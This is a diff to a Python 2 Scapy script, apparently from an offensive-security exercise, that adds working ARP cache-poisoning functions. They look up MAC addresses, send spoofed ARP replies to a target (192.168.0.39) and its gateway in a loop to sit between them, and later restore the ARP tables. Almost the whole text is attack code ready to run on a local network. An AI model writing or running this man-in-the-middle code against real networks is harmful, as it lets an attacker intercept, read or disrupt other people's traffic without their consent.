@@ -5,12 +5,54 @@ import threading
 import signal
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    # slightly different method using send
+    print "[*] Restoring target..."
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
 
+    # signals the main thread to exit
+    os.kill(os.getpid(), signal.SIGINT)
 
+def get_mac(ip_address):
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
+    # returns MAC address from a response
+    for s,r in responses:
+        return r[Ether].src
+    return None
 
-interface       = "en0"
-target_ip       = "192.168.100.60"
-gateway_ip      = "192.168.100.1"
+def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    poison_target = ARP()
+    poison_target.op    = 2
+    poison_target.psrc  = gateway_ip
+    #poison_target.hwsrc = [OUR Kali MAC]
+    poison_target.pdst  = target_ip
+    poison_target.hwdst = target_mac
+
+    poison_gateway = ARP()
+    poison_gateway.op   = 2
+    poison_gateway.psrc = target_ip
+    #poison_gateway.hwsrc = [OUR Kali MAC]
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst= gateway_mac
+
+    print "[*] Beginning the ARP Poisoning. [CTRL-C to stop]"
+    
+    while True:
+        try:
+            send(poison_target)
+            send(poison_gateway)
+
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+            return 
+
+    print "[*] ARP Poisoning attack finished."
+    return
+
+interface       = "eth0"
+target_ip       = "192.168.0.39"
+gateway_ip      = "192.168.0.1"
 packet_count    = 1000
 
 # set our interface
